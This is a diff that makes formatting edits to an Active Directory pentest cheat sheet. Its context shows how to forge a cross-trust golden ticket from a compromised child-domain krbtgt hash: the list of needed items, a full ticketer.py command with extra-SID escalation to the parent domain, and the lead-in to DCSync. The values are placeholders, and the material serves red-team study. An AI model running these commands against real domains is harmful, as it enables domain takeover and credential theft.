@@ -816,15 +816,15 @@ megacorp.com         child.megacorp.local External    Bidirectional
 megacorp.local       child.megacorp.local ParentChild Bidirectional
 ```
 
-Exploiting Bidirectional-ParentChild trust between child.megacorp.local <-> megacorp.local...
+Exploiting Bidirectional-ParentChild trust between child.megacorp.local <-> megacorp.local.
 
 For creating a cross-trust golden ticket we'll need:
 
-1. child domain FQDN (child.megacorp.local);
-2. name of the child domain's DC machine account and its RID (DC01$, 31337);
-3. the SID of the child domain (S-1-5-21-4266912945-3985045794-2943778634);
-4. the SID of the parent domain (S-1-5-21-2284550090-1208917427-1204316795);
-5. compomised krbtgt hash from the child domain (00ff00ff00ff00ff00ff00ff00ff00ff);
+1. child domain FQDN (`child.megacorp.local`);
+2. name of the child domain's DC machine account and its RID (`DC01$`, `31337`);
+3. the SID of the child domain (`S-1-5-21-4266912945-3985045794-2943778634`);
+4. the SID of the parent domain (`S-1-5-21-2284550090-1208917427-1204316795`);
+5. compomised krbtgt hash from the child domain (`00ff00ff00ff00ff00ff00ff00ff00ff`);
 6. ???
 7. PROFIT.
 
@@ -854,7 +854,7 @@ Or
 $ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -user-id 31337 -groups 516 -domain child.megacorp.local -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -extra-sid S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 'DC01'
 ```
 
-For DCSyncing we'll need only parent domain FQDN (megacorp.local):
+For DCSyncing we'll need only parent domain FQDN (`megacorp.local`):
 
 ```
 PS > ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
